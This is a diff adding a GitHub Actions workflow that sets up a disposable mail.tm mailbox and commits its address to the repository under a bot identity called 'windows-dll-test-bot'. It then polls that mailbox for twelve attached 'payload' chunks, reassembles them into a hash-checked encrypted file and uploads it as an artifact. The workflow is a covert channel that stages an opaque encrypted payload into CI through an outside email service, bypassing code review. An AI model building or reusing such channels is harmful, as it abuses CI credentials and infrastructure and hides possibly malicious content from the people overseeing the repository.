@@ -1,0 +1,86 @@
+name: exact-87ec-stage-current-payload-12
+on:
+  push:
+    branches: [87ec-final-fullreg-20260809]
+    paths: ['.github/workflows/87ec_stage_current_payload_12.yml']
+permissions:
+  contents: write
+jobs:
+  stage:
+    runs-on: windows-2022
+    timeout-minutes: 45
+    env:
+      BRANCH: 87ec-final-fullreg-20260809
+      ENC_SHA: 3cbe4e8339d3f934a1766a66e48a6ca794c32a262f768f43e6b9548d5276b5d9
+    steps:
+      - uses: actions/checkout@v4
+        with: {fetch-depth: 0, persist-credentials: true}
+      - name: Publish small-chunk mailbox
+        shell: powershell
+        run: |
+          $ErrorActionPreference='Stop'
+          @'
+          import json,os,secrets,string,urllib.request
+          from pathlib import Path
+          def rq(method,url,obj=None,token=None):
+              data=None if obj is None else json.dumps(obj).encode();h={'Accept':'application/json'}
+              if data is not None:h['Content-Type']='application/json'
+              if token:h['Authorization']='Bearer '+token
+              with urllib.request.urlopen(urllib.request.Request(url,data=data,method=method,headers=h),timeout=30) as r:return json.load(r)
+          base='https://api.mail.tm';d=rq('GET',base+'/domains');m=d if isinstance(d,list) else d.get('hydra:member',[])
+          if not m:raise SystemExit('MAIL_DOMAIN_FAIL')
+          a=string.ascii_lowercase+string.digits;addr='gh87stage'+''.join(secrets.choice(a) for _ in range(15))+'@'+m[0]['domain'];pw=''.join(secrets.choice(string.ascii_letters+string.digits+'-_') for _ in range(40))
+          rq('POST',base+'/accounts',{'address':addr,'password':pw});tok=rq('POST',base+'/token',{'address':addr,'password':pw})['token']
+          Path(os.environ['RUNNER_TEMP'],'mail.json').write_text(json.dumps({'address':addr,'token':tok}));Path('mailbox12.txt').write_text(addr+'\n');Path('subject12.txt').write_text('GuanHu-87EC-STAGE12-'+os.environ['GITHUB_RUN_ID']+'\n');print('STAGE12_MAILBOX_READY',addr)
+          '@|Set-Content -Encoding ascii $env:RUNNER_TEMP\make_mail.py
+          python $env:RUNNER_TEMP\make_mail.py;if($LASTEXITCODE -ne 0){exit $LASTEXITCODE}
+          $d=".87ec_stage12_handoff\run_$env:GITHUB_RUN_ID";New-Item -ItemType Directory -Force $d|Out-Null;Copy-Item mailbox12.txt,subject12.txt $d -Force;"RUN_ID=$env:GITHUB_RUN_ID`nENC_SHA=$env:ENC_SHA"|Set-Content (Join-Path $d binding.txt)
+          git config user.name windows-dll-test-bot;git config user.email windows-dll-test-bot@users.noreply.github.com;git add $d;git commit -m "Publish 87ec stage12 mailbox run $env:GITHUB_RUN_ID";if($LASTEXITCODE -ne 0){throw 'COMMIT_FAIL'};git push origin "HEAD:$env:BRANCH";if($LASTEXITCODE -ne 0){throw 'PUSH_FAIL'}
+      - name: Receive twelve small encrypted chunks
+        shell: powershell
+        timeout-minutes: 35
+        run: |
+          $ErrorActionPreference='Stop'
+          @'
+          import json,os,time,urllib.request,urllib.parse
+          from pathlib import Path
+          c=json.loads(Path(os.environ['RUNNER_TEMP'],'mail.json').read_text());tok=c['token'];base='https://api.mail.tm';prefix=Path('subject12.txt').read_text().strip();want={f'{prefix}-P{i:02d}':i for i in range(1,13)};out=Path('chunks');out.mkdir(exist_ok=True);got=set();seen=set()
+          def j(u):
+              r=urllib.request.Request(u,headers={'Accept':'application/json','Authorization':'Bearer '+tok});
+              with urllib.request.urlopen(r,timeout=45) as x:return json.load(x)
+          def b(u):
+              r=urllib.request.Request(u,headers={'Authorization':'Bearer '+tok});
+              with urllib.request.urlopen(r,timeout=90) as x:return x.read()
+          end=time.time()+2000
+          while time.time()<end and len(got)<12:
+              q=j(base+'/messages');items=q if isinstance(q,list) else q.get('hydra:member',[])
+              for m in items:
+                  s=m.get('subject','');mid=m.get('id')
+                  if s not in want or mid in seen:continue
+                  d=j(base+'/messages/'+mid);i=want[s];found=False
+                  for a in d.get('attachments',[]):
+                      n=a.get('filename','');u=a.get('downloadUrl')
+                      if not u:continue
+                      z=b(urllib.parse.urljoin(base,u))
+                      if n==f'payload_part{i:02d}.bin':(out/n).write_bytes(z);got.add(i);found=True
+                  if found:seen.add(mid)
+              print('STAGE12_PROGRESS',len(got),sorted(got),flush=True)
+              if len(got)<12:time.sleep(3)
+          if len(got)!=12:raise SystemExit(f'STAGE12_INCOMPLETE {sorted(got)}')
+          print('STAGE12_RECEIVE_PASS')
+          '@|Set-Content -Encoding ascii $env:RUNNER_TEMP\recv.py
+          python $env:RUNNER_TEMP\recv.py 2>&1|Tee-Object receive12.log;if($LASTEXITCODE -ne 0){exit $LASTEXITCODE}
+      - name: Reassemble exact encrypted payload
+        shell: powershell
+        run: |
+          $ErrorActionPreference='Stop';$o=[IO.File]::Create('c8b8_fullreg_payload.enc');try{1..12|%{$p=('chunks\payload_part{0:D2}.bin'-f $_);$s=[IO.File]::OpenRead($p);try{$s.CopyTo($o)}finally{$s.Dispose()}}}finally{$o.Dispose()};$h=(Get-FileHash c8b8_fullreg_payload.enc -Algorithm SHA256).Hash.ToLowerInvariant();if($h -ne $env:ENC_SHA){throw "REASSEMBLY_SHA_FAIL $h"};"STAGE12_REASSEMBLY_PASS`nENC_SHA=$h`nBYTES=$((Get-Item c8b8_fullreg_payload.enc).Length)"|Set-Content stage12_pass.txt
+      - name: Upload durable exact encrypted payload
+        uses: actions/upload-artifact@v4
+        with:
+          name: exact-87ec-current-encrypted-payload-${{ github.run_id }}
+          path: |
+            c8b8_fullreg_payload.enc
+            stage12_pass.txt
+            receive12.log
+          if-no-files-found: error
+          retention-days: 30
